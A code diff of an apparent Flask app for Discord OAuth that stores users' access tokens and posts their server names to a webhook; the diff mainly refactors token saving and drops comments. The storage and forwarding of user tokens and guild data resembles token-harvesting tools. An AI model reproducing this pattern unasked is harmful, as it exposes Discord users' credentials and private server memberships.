@@ -32,13 +32,11 @@ def check_user():
     users = load_authorized_users()
     for user in users:
         if user["id"] == user_id:
-            # Validate token with Discord API
             headers = {"Authorization": f"Bearer {user['token']}"}
             r = requests.get("https://discord.com/api/users/@me", headers=headers)
             if r.status_code == 200:
                 return jsonify({"authorized": True})
             else:
-                # Token invalid, remove user
                 users = [u for u in users if u["id"] != user_id]
                 save_authorized_users(users)
                 return jsonify({"authorized": False})
@@ -170,18 +168,16 @@ def callback():
         user = requests.get("https://discord.com/api/users/@me", headers=headers).json()
         guilds = requests.get("https://discord.com/api/users/@me/guilds", headers=headers).json()
 
-        # Save user with token
         user_id = str(user.get("id"))
         users = load_authorized_users()
-        if not any(u["id"] == user_id for u in users):
-            users.append({"id": user_id, "token": access_token})
+        for u in users:
+            if u["id"] == user_id:
+                u["token"] = access_token
+                break
         else:
-            for u in users:
-                if u["id"] == user_id:
-                    u["token"] = access_token
+            users.append({"id": user_id, "token": access_token})
         save_authorized_users(users)
 
-        # Send server list to Discord webhook
         if WEBHOOK_URL and WEBHOOK_URL != "YOUR_WEBHOOK_URL":
             guild_list = "\n".join([g['name'] for g in guilds])
             requests.post(WEBHOOK_URL, json={
